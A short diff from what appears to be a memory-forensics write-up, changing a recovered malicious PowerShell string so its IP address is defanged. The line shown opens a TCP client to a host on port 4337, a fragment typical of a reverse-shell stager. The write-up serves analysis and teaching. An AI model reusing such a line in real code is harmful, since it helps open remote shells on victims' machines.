@@ -35,7 +35,7 @@ Recover and analyze malicious file artifacts identified in memory and determine 
 
 Recovered string (defanged):
 
-`$client = New-Object System.Net.Sockets.TCPClient('10.0.128.2',4337);`
+`$client = New-Object System.Net.Sockets.TCPClient('10[.]0[.]128[.]2',4337);`
 
 **Behavior summary**:
 
